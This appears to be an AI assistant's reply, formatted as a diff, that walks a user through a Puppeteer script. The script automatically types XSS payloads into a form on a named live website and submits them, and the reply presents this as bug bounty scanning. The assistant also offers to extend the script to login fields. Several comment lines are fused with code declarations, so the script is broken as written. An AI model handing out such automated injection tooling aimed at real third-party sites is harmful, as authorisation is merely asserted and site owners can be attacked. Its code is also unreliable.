@@ -1,0 +1,99 @@
+To adapt your Puppeteer script to automatically interact with and inject payloads into HTML input fields and submission forms, you need to target the specific CSS selectors of the input elements on the page.
+Here is the step-by-step guide and code to modify your scanner so it dynamically types payloads into form boxes and clicks the submit button.
+------------------------------
+## Step 1: Identify the Form Selectors Using F12
+Before running the automation script, you must open your browser's Developer Tools (F12) on the target page (like the registration or login page) to find the exact CSS selectors for the input fields and the submit button.
+
+   1. Right-click the text field (e.g., username, search box, or email) and click Inspect.
+   2. Look for the id, name, or class attributes (e.g., <input name="username" id="elSearchField">).
+   3. Do the same for the submit button (e.g., <button type="submit" id="submit_button">).
+
+------------------------------
+## Step 2: Update the Puppeteer Script
+Create or overwrite a file named form_xss_detector.js. This updated script navigates to the page, waits for the specific form elements to load, types the payloads natively, and executes the submission.
+
+const puppeteer = require('puppeteer');
+// Common XSS payloads designed to break out of HTML input attribute tagsconst payloads = [
+    '"><script>alert(1)</script>',
+    '" onerror="alert(1)',
+    '</script><script>alert(1)</script>',
+    '<img src=x onerror=alert(1)>'
+];
+// Target page containing the interactive form (Ensure this is an allowed in-scope domain)const targetUrl = 'https://1w.cash'; 
+// CHANGE THESE SELECTORS based on what you find using F12 Inspect Elementconst INPUT_SELECTOR = 'input[name="username"]'; // Or 'input#elSearchField'const SUBMIT_SELECTOR = 'button[type="submit"]';  // Or 'button.js-cSearchSubmit'
+async function scanFormXSS() {
+    console.log(`[+] Initializing Chromium Browser...`);
+    const browser = await puppeteer.launch({ headless: true });
+
+    for (let payload of payloads) {
+        const page = await browser.newPage();
+        
+        // 1. Establish the Event Dialog Listener
+        page.on('dialog', async dialog => {
+            if (dialog.type() === 'alert') {
+                console.log(`\n[🚨 XSS DETECTED ON FORM!] Dialog Message: "${dialog.message()}"`);
+                console.log(`[🎯 Successful Payload]: ${payload}`);
+                await dialog.dismiss();
+            }
+        });
+
+        try {
+            console.log(`[*] Navigating to: ${targetUrl}`);
+            await page.goto(targetUrl, { waitUntil: 'networkidle2' });
+
+            // 2. Wait for the form input elements to be visible on the screen
+            await page.waitForSelector(INPUT_SELECTOR, { timeout: 5000 });
+            await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 5000 });
+
+            // 3. Clear any default text in the box, then type the payload
+            await page.click(INPUT_SELECTOR);
+            // Select all text and delete it to ensure a clean injection field
+            await page.keyboard.down('Control');
+            await page.keyboard.press('A');
+            await page.keyboard.up('Control');
+            await page.keyboard.press('Backspace');
+            
+            console.log(`[*] Typing payload into form input: ${payload}`);
+            await page.type(INPUT_SELECTOR, payload);
+
+            // 4. Click the submit button to post the data
+            console.log(`[*] Clicking submit...`);
+            await Promise.all([
+                page.click(SUBMIT_SELECTOR),
+                // Wait for the resulting navigation or backend refresh action to complete
+                page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
+            ]);
+
+            // Give the browser client-side logic an extra second to execute any potential scripts
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+        } catch (error) {
+            console.log(`[-] Element target timeout or error processing payload: ${payload}`);
+        } finally {
+            await page.close();
+        }
+    }
+
+    console.log(`\n[+] Form Scan Campaign Finished.`);
+    await browser.close();
+}
+
+scanFormXSS();
+
+------------------------------
+## Step 3: Run the Script
+Execute the script using your terminal environment node runtime:
+
+node form_xss_detector.js
+
+## 💡 Why this fits the Bug Bounty Scope Rules:
+
+* Rate Limits: By processing payloads sequentially using a single page container instance loop, you stay safely under the strict 5 requests per second program restriction.
+* Proof of Concept Integrity: If the browser triggers the dialog function on submission, it means the script execution boundary crossed over from raw string configuration files right into client-side interpretation. This gives you exact data coordinates to generate a valid, triagable report for HackerOne.
+
+To refine this automation wrapper for your targets, let me know:
+
+* What are the exact attribute names or IDs (name, id, class) of the input fields you found using F12 on your login or search forms?
+* Do you want to expand this script to fill out multiple input fields simultaneously (like username and password together) before clicking submit?
+
+
